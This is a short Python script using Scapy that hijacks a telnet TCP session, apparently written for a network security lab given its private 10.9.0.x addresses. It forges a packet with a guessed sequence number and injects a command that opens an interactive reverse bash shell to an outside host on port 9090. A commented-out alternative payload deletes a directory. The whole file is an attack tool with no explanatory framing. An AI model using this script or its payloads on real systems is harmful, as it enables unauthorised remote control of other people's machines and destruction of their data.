#!/usr/bin/env python3
from scapy.all import *
ip = IP(src="10.9.0.7", dst="10.9.0.6")
tcp = TCP(sport=40890, dport=23, flags="A", seq=3622303790, ack=1292187770)
##data = "\n rm -r /pippo \n"
data = "\n /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \n"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
